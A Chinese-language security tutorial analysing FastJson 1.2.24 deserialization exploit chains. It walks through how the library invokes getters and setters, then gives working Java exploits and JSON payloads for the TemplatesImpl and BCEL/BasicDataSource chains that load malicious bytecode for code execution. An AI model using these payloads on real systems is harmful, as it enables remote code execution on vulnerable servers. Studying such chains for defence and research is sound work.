# FastJson-1.2.24 利用链分析

## 初识FastJson

FastJson 是阿里巴巴旗下的开源 json 解析库，通过解析 json 字符串，将 json 字符串反序列化转换成 JavaBean，同时也能将 JavaBean 序列化为 json 字符串。FastJson 见名知意，主打特点就是快，在初期以其性能快速的优势俘获大批用户的芳心。

FastJson 的用户群特别庞大，因此一旦爆出相关漏洞，波及范围和影响都是难以控制的，这也是 FastJson 的漏洞受到广大安全研究员关注的原因之一。时至今日，FastJson 的漏洞在被广大安全研究员提交与披露之后，已经经过多轮的安全更新。

从本文开始，接下来让我们体验那段属于 FastJson 的爱恨情仇。

## FastJson使用

既然 FasjJson 的功能是将 JavaBean 序列成 json 字符串以及将 json 字符串反序列化成 JavaBean 对象，我们就从这里开始说起。

### JavaBean序列化成Json

先在 pom 文件添加一下 FastJson 的依赖
```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
```

序列化常用到的方法是：`JSON.toJSONString()`，下面写一个简单的 Demo 作为示例：
```java
package com.fastjson.fastjson;

import com.alibaba.fastjson.JSON;

/**
 * Created by dotast on 2022/12/21 10:36
 */
public class Demo {
    public static void main(String[] args){
        User user = new User();
        user.setName("dotast");
        String userJson = JSON.toJSONString(user);
        System.out.println(userJson);
    }

}

class User {
    private String name;

    public User(){
        System.out.println("调用构造函数");
    }

    public String getName() {
        System.out.println("调用getter");
        return name;
    }

    public void setName(String name) {
        System.out.println("调用setter");
        this.name = name;
    }

}
```

![image-20221221104721243](images/image-20221221104721243.png)

运行后发现，我们的代码中并没有调用 getter，但却自动调用到了，这个特性在后面将会用到。

通过跟进`toJSONString()`方法，可以看见不同类型参数的多个重载方法，例如以下几个：

> - 序列化特性：`com.alibaba.fastjson.serializer.SerializerFeature`，可以通过设置多个特性到 `FastjsonConfig` 中全局使用，也可以在使用具体方法中指定特性。
> - 序列化过滤器：`com.alibaba.fastjson.serializer.SerializeFilter`，这是一个接口，通过配置它的子接口或者实现类就可以以扩展编程的方式实现定制序列化。
> - 序列化时的配置：`com.alibaba.fastjson.serializer.SerializeConfig` ，可以添加特点类型自定义的序列化配置。

### Json反序列成JavaBean

在 FastJson 中，可以通过`@type`参数将反序列化后的 JavaBean 转换为该参数指定的类的类型，并自动调用该类中的`getter()`和`setter()`方法。

反序列化常用到的方法是：`parse()`、`parseObject()`和`parseArray()`，下面还是通过一个 Demo 进行了解一下：

先写一个 Evil 类
```java
package com.fastjson.fastjson;

/**
 * Created by dotast on 2022/12/21 11:11
 */
public class Evil {
    String cmd;

    public String getCmd() {
        System.out.println("调用Evil类的getter");
        return cmd;
    }

    public void setCmd(String cmd) throws Exception {
        System.out.println("调用Evil类的setter");
        this.cmd = cmd;
    }

}
```

再写一个 Demo 类

```java
package com.fastjson.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

/**
 * Created by dotast on 2022/12/21 10:36
 */
public class Demo {
    public static void main(String[] args) throws Exception{
        // 序列化
        User user = new User();
        String userJson = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(userJson);
        // 反序列化
        System.out.println("--------------------------");
        String evilJson = "{\"@type\":\"com.fastjson.fastjson.Evil\",\"name\":\"dotast\"}";
        Object user1 = JSON.parse(evilJson);
        System.out.println("parse: "+user1.getClass());
        System.out.println("--------------------------");
        Object user2 = JSON.parseObject(evilJson);
        System.out.println("parseObject: "+user2.getClass());
        System.out.println("--------------------------");
        Object user3 = JSON.parseObject(evilJson, Evil.class);
        System.out.println("parseObject: "+user3.getClass());
        System.out.println("--------------------------");
        // 反序列化调用恶意类的setter方法
        evilJson = "{\"@type\":\"com.fastjson.fastjson.Evil\",\"cmd\":\"dotast\"}";
        Object user4 = JSON.parseObject(evilJson);
        System.out.println("parseObject: "+user4.getClass());
    }
}

class User {
    private String name;

    public User(){
        System.out.println("调用use类的构造函数");
    }

    public String getName() {
        System.out.println("调用user类的getter");
        return name;
    }

    public void setName(String name) {
        System.out.println("调用user类的setter");
        this.name = name;
    }

}
```

![image-20221221155049771](images/image-20221221155049771.png)

通过输出结果可以看到：`JSON.parse()`方法会返回`@type`参数指定的`Evil`类，`JSON.parseObject()`方法会返回`fastjson.JSONObject`类。但`JSON.parseObject()`方法可以通过加入指定的类作为参数传入，达到和`JSON.parse()`方法一样返回`Evil`类的效果。

此外，使用 `JSON.parseObject(evilJson)`方法将会返回`fastjson.JSONObject`类，且`Evil`类中的所有 getter 与 setter 方法都会被调用。

### getter和setter方法的调用分析

在前面的 demo 中，在调用序列化方法`JSON.toJSONString()`方法时会自动调用`getter()`，在调用反序列化方法`JSON.parse()`和`JSON.parseObject()`时，会自动调用`getter()`和`setter()`。

先看看 FastJson 具体的处理方式，跟进`JavaBeanInfo#build()`方法
![image-20221221145940782](images/image-20221221145940782.png)

一开始，通过反射获取了类的所有属性和方法并存进数组中，接着往下走
![image-20221221150158374](images/image-20221221150158374.png)

第一个 if 判断默认构造方法为空并且不是接口和抽象类的条件，`Evil`类不满足，进入 else 判断中
![image-20221221150422283](images/image-20221221150422283.png)

继续往下走
![image-20221221151045235](images/image-20221221151045235.png)

做了几个判断，具体代码为：
```java
if (methodName.length() >= 4 && !Modifier.isStatic(method.getModifiers()) && (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass())))
```

要求方法名长度不能小于4、不能为静态方法、返回的类型为 void 或者自己本身，接着又通过`types.length == 1`要求传入的参数个数必须为一个以及方法名第四个字符要大写等等，继续往下走
![image-20221221151311242](images/image-20221221151311242.png)

继续判断方法开头必须为`set`，继续往下走
![image-20221221151433771](images/image-20221221151433771.png)

最后将满足条件的添加到`FieldInfo`中
![image-20221221151635014](images/image-20221221151635014.png)

接下来看看调用 getter 的
![image-20221221151820921](images/image-20221221151820921.png)

具体判断代码为：
```java
if (methodName.length() >= 4 && !Modifier.isStatic(method.getModifiers()) && methodName.startsWith("get") && Character.isUpperCase(methodName.charAt(3)) && method.getParameterTypes().length == 0 && (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType()))
```

和前面的差不多，要求方法名长度大于4、不能为静态方法，方法名要以`get`开头、同时第四个字符要大写、返回的类型要继承自这几个类之一：`Collection`、`Map`、`AtomicBoolean`、`AtomicInteger`、`AtomicLong`，最后要求传入的参数个数为0，符合条件的方法会被添加到`FieldInfo`中。

最后返回`JavaBeanInfo`对象
![image-20221221152419006](images/image-20221221152419006.png)

以 getter 为例，最后在`JavaBeanSerializer#getFieldValuesMap()`方法中进行调用
![image-20221221152957548](images/image-20221221152957548.png)

### Feature.SupportNonPublicField

该字段在 FastJson 1.2.22 版本开始引入，这也是为什么如果用到该参数的链子只影响 1.2.22 - 1.2.24 版本的原因所在。

在目标类的私有变量没有`setter()`方法时，通过`JSON.parseObject(evilJson, Evil.class, Feature.SupportNonPublicField)`可以给该变量进行赋值。

## FastJson反序列化之TemplatesImpl(1.2.22 - 1.2.24)

先看看网上的相关漏洞描述：

> 影响版本：`fastjson <= 1.2.24`
>
> 描述：fastjson 默认使用 `@type` 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter/setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。

既然 FastJson 的漏洞的触发关键点之一在于会调用 getter 和 setter 方法，在我们前面的学习过的知识中，你第一个想到的会是谁？

在 [CommonsBeanutils利用链分析](../../03-反序列化专区/12-CommonsBeanutils/index.md) 一文中，我们就曾通过`PropertyUtils.getProperty()`方法可以调用任意`JavaBean`中的`getter()`方法的特性，调用了`TemplatesImpl#getOutputProperties()`方法完成一条 CB 利用链
```
TemplatesImpl.getOutputProperties()
    TemplatesImpl.newTransformer()
        TemplatesImpl.getTransletInstance()
            TemplatesImpl.defineTransletClasses()
            TemplatesImpl.TransletClassLoader.defineClass()
```

那么很显然在 FastJson 中我们依然可以调用该类，通过`getter()`调用`getOutputProperties()`方法，通过`setter()`方法设置`_bytecodes`、`_name`、`_tfactory`和`_outputProperties`属性

注意，这里`getOutputProperties()`是`_outputProperties`属性的`getter()`方法，因为`_`字符会被处理替换为空，这里见于`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()`方法
![image-20221221162602369](images/image-20221221162602369.png)

在我们设置`_bytecodes`的值的时候还需要进行 Base64编码，因为对于`byte[]`类型的 Field，在序列化与反序列化时会进行 Base64 编码和解码的操作。

以`com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze()`方法为例
![image-20221221165141721](images/image-20221221165141721.png)

跟进`bytesValue()`方法到`com.alibaba.fastjson.parser.JSONScanner#bytesValue()`，在这里进行了 Base64 解码操作
![image-20221221165020317](images/image-20221221165020317.png)

到这里，已经可以写出 exp 了
```java
package com.fastjson.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.Base64;

/**
 * Created by dotast on 2022/12/21 16:28
 */
public class FastJson124 {
    public static void main(String[] args) throws Exception {
        // 加载恶意类字节码
        byte[] classBytes = getBytes();
        String classCode = Base64.getEncoder().encodeToString(classBytes);
        String targetClass = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String exp = "{\"@type\":\""+ targetClass + "\",\"_bytecodes\":[\""+ classCode + "\"],\"_name\":\"name\",\"_tfactory\":{},\"_outputProperties\":{},}";
        System.out.println(exp);
        JSON.parseObject(exp, Object.class, Feature.SupportNonPublicField);

    }

    public static byte[] getBytes() throws Exception{
        InputStream inputStream = new FileInputStream(new File("./target/classes/com/test/tool/ExecEvilClass.class"));
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        int a = -1;
        while((a = inputStream.read())!=-1){
            bao.write(a);
        }
        byte[] bytes = bao.toByteArray();
        return bytes;

    }
}
```

![image-20221221165555279](images/image-20221221165555279.png)

成功执行恶意类中的弹出计算器命令。

写到这里，其实我们还是没有了解 FastJson 是如何进行反序列化的，下面我们以上面的`FastJson124`类为例子跟一下具体流程

我们从`parseObject()`方法看起
![image-20221221173541692](images/image-20221221173541692.png)

在该方法中，实例化了一个`DefaultJSONParser`对象，我们跟进该构造方法
![image-20221221174529708](images/image-20221221174529708.png)

设置了`lexer.token`的值为 12，回到`parseObject()`方法继续往下走![image-20221221173702419](images/image-20221221173702419.png)

调用了`DefaultJSONParser#parseObject()`方法处理我们参数中的`Object`类，跟进该方法
![image-20221221175754360](images/image-20221221175754360.png)

在该方法中，通过`config.getDeserializer()`方法获取对应类型的的反序列化器，跟进该方法看看
![image-20221221175902221](images/image-20221221175902221.png)

我们传入的 type 是`Object.class`，因此直接找到了对应的反序列化器并进行 return 返回

![image-20221221174021767](images/image-20221221174021767.png)

接着通过`derializer.deserialze()`方法来反序列化我们传入的类，继续往下走到`DefaultJSONParser#parse()`方法
![image-20221221174736347](images/image-20221221174736347.png)

根据前面设置的`lexer.token`为 12，我们进入`case 12`
![image-20221221174843549](images/image-20221221174843549.png)

在`case 12`中，新建了一个`JSONObject`对象，然后再次调用`parseObject()`方法进行解析，继续跟进该方法
![image-20221221180136606](images/image-20221221180136606.png)

和前面一样的流程，我们再次跟进`getDeserializer()`方法
![image-20221221180225729](images/image-20221221180225729.png)

因为这次传入的 type 是`TemplatesImpl.class`，找不到对应的反序列化器，进入第二个 if 判断，调用`getDeserializer()`方法，跟进该方法
![image-20221221180700574](images/image-20221221180700574.png)

依然获取不到对应的反序列化构造器，往下走
![image-20221221180741766](images/image-20221221180741766.png)

这里获取了类的名称，如果含有`$`会替换为空，接着又开始通过遍历`denyList`进行判断，如果以其中的元素开头，就会抛出错误，也就是一个黑名单机制，而`denyList`中的元素是`java.lang.Thread`。

一直往下走
![image-20221221181029775](images/image-20221221181029775.png)

因为`TemplatesImpl.class`都不满足前面的条件，最后会调用`createJavaBeanDeserializer()`方法创建一个反序列化器，跟进该方法
![image-20221221181205048](images/image-20221221181205048.png)

发现会调用`JavaBeanInfo.build()`方法，也就是我们前面一开始分析过的流程，最后获取完对应的反序列化器之后，开始进入`deserializer.deserialze()`方法中
![image-20221221181742589](images/image-20221221181742589.png)

在`deserializer.deserialze()`方法里，最终调用`createInstance()`方法进行实例化
![image-20221221182133968](images/image-20221221182133968.png)

下面就是`createInstance()`方法的实例化流程
![image-20221221182247243](images/image-20221221182247243.png)

至此，FastJson 反序列化流程算是告一段落。

到这里不难发现该条攻击链限制非常大，要求存在漏洞的目标使用`JSON.parseObject()`方法时，需要存在第三个参数`Feature.SupportNonPublicField`才能利用，在实战中过于理想化。

因此接下来，我们将探索 FastJson 的其他利用方法。

## FastJson反序列化之BCEL(1.1.15 - 1.2.4)

该攻击方法除了需要 FastJson 的依赖，还需要 dbcp 的依赖：

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>dbcp</artifactId>
    <version>6.0.53</version>
</dependency>
```

因为我们需要的类为`org.apache.tomcat.dbcp.dbcp.BasicDataSource`（不同版本依赖包路径不同）
![image-20221229122746688](images/image-20221229122746688.png)

可以看到当`driverClassLoader`不为空时进入 else 条件语句中，可以通过反射调用自定义类加载器加载字节码，同时`driverClassName`和`driverClassLoader`都有对应的 setter 方法
![image-20221229123019524](images/image-20221229123019524.png)

![image-20221229123234700](images/image-20221229123234700.png)

那接下来就是找一下怎么调用`createConnectionFactory()`方法
![image-20221229123356517](images/image-20221229123356517.png)

可以看到在`createDataSource()`方法中调用了`createConnectionFactory()`，接下来找哪里调用了`createDataSource()`方法
![image-20221229123506403](images/image-20221229123506403.png)

在`getConnection()`方法中调用了`createDataSource()`方法，而`getConnection()`是一个 getter 方法，是我们要寻找的最终目标，接下来就是调用`com.sun.org.apache.bcel.internal.util.ClassLoader`类加载器加载字节码进行利用，即构造如下的 POC：
```json
{
    "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource", 
    "driverClassLoader": {
        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    }, 
    "driverClassName": "$$BCEL$$......"
}
```

但运行后并未成功执行恶意类中编写的命令，问题出在了哪里呢？经过一番调试，发现并没有调用到`getConnection()`方法，原因是该方法返回的类型为`Connection`，不满足我们前面说过的继承于`Collection`、`Map`、`AtomicBoolean`、`AtomicInteger`和`AtomicLong`之中的任意一个类的条件。

有两种办法解决该问题。

第一种就是再使用一层`{}`将其包裹，变成如下的格式：

```json
{
       {
         "aaa":{
                  "@type":"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
                   "driverClassLoader":{
                     "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                    },
                   "driverClassName":"$$BCEL$$......"
       }
     }:"bbb"
}
```

此时会把`{}`当做一个`JSONObject`对象进行逐层解析
![image-20221229172644495](images/image-20221229172644495.png)

如上图所示，此时的 key 为：`{"aaa":{......}}`，value 为`bbb`，而`JSONObject`正好实现了`Map`接口和继承于`JSON`类。在调用`key.toString()`方法时，会调用到`JSON.toString()`方法
![image-20221229174756265](images/image-20221229174756265.png)

随后步入到`write()`方法，最后调用`JavaBeanSerializer#write()`方法
![image-20221229184650578](images/image-20221229184650578.png)

从图中可以看到，获得了该类所有 getter 方法，最终调用到`getConnection()`方法。

贴一下调用链图：
![image-20221229185511514](images/image-20221229185511514.png)

编写 exp：
```java
package com.fastjson.fastjson;

import com.alibaba.fastjson.JSON;
import com.fastjson.becl.EvilDemo;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

/**
 * Created by dotast on 2022/12/29 12:02
 */
public class FastJson124Bcel {
    public static void main(String[] args) throws Exception {
        // 加载恶意类字节码
        JavaClass javaClass = Repository.lookupClass(EvilDemo.class);
        String byteCode = "$$BCEL$$" + Utility.encode(javaClass.getBytes(), true);
        String targetClass = "org.apache.tomcat.dbcp.dbcp.BasicDataSource";
        String bcelClass = "com.sun.org.apache.bcel.internal.util.ClassLoader";
        String exp = "{\n" +
                "       {\n" +
                "         \"aaa\":{\n"+
                "                  \"@type\":\"" + targetClass + "\",\n" +
                "                   \"driverClassLoader\":{\n" +
                "                     \"@type\": \"" + bcelClass + "\"\n" +
                "                    },\n" +
                "                   \"driverClassName\":\"" + byteCode + "\"\n" +
                "       }\n" +
                "     }:"+"\"bbb\"\n" +
                "}";
        System.out.println(exp);
        JSON.parse(exp);
    }
}

```

运行后成功执行恶意类的命令
![image-20221229185834928](images/image-20221229185834928.png)

另一种解决方法就是使用`JSON.parseObject()`方法，还是保持原来的格式：
```json
{
    "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource", 
    "driverClassLoader": {
        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    }, 
    "driverClassName": "$$BCEL$$......"
}
```

编写 exp：
```java
package com.fastjson.fastjson;

import com.alibaba.fastjson.JSON;
import com.fastjson.becl.EvilDemo;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

/**
 * Created by dotast on 2022/12/29 12:02
 */
public class FastJson124Bcel {
    public static void main(String[] args) throws Exception {
        // 加载恶意类字节码
        JavaClass javaClass = Repository.lookupClass(EvilDemo.class);
        String byteCode = "$$BCEL$$" + Utility.encode(javaClass.getBytes(), true);
        String targetClass = "org.apache.tomcat.dbcp.dbcp.BasicDataSource";
        String bcelClass = "com.sun.org.apache.bcel.internal.util.ClassLoader";
        String exp = "{\n"+
                "      \"@type\":\"" + targetClass + "\",\n" +
                "      \"driverClassLoader\":{\n" +
                "      \"@type\": \"" + bcelClass + "\"\n" +
                "       },\n" +
                "      \"driverClassName\":\"" + byteCode + "\"\n" +
                "       }\n";
        System.out.println(exp);
        JSON.parseObject(exp);
    }
}
```

与`JSON.parse()`方法不同的是，`JSON.parseObject()`方法多调用了`JSON.toJSON()`方法将 Java 对象转换为 JSONObject 对象。

## FastJson反序列化之JNDI

待补充

## 总结

这里贴一张其他师傅发的 FastJson 框架图

![1616458393831](images/1616458393831.png)

- 反序列方法中，`JSON.parse()`和`JSON.parseObject()`的实现效果一样，前者会在解析 json 字符串时获取`@type`参数指定的类，后者则是可以通过参数中的类进行使用。除此之外，`JSON.parseObject()`方法多调用了`JSON.toJSON()`方法将 Java 对象转换为 JSONObject 对象。

- FastJson 在创建类的示例时，会通过反射调用符合判断条件的该类的 getter 或者 setter 方法，其中 getter 需要满足的条件为：

  1. 方法名长度需要大于4；
  2. 不能为静态方法；
  3. 方法名要以`get`开头，同时第四个字符需要大写；
  4. 传入的参数个数为 0；
  5. 返回的类型要继承自这几个类之一：`Collection`、`Map`、`AtomicBoolean`、`AtomicInteger`、`AtomicLong`。

  而 setter 需要满足的条件为：

  1. 方法名长度需要大于4；
  2. 不能为静态方法；
  3. 方法名要以`set`开头，同时第四个字符需要大写；
  4. 传入的参数个数为 1；
  5. 返回的类型为 void 或者自己本身。

- 在目标类的私有变量没有`setter()`方法时，通过`JSON.parseObject(evilJson, Evil.class, Feature.SupportNonPublicField)`可以给该变量进行赋值。

- 使用 `JSON.parseObject(evilJson)`方法将会返回`fastjson.JSONObject`类，且`Evil`类中的所有 getter 与 setter 方法都会被调用。

- FastJson 在寻找类属性的 getter 和 setter 方法时，会忽略 `_`和`-` 字符串。

- 对于`byte[]`类型的 Field，在序列化与反序列化时，FastJson 会进行 Base64 编码和解码的操作。

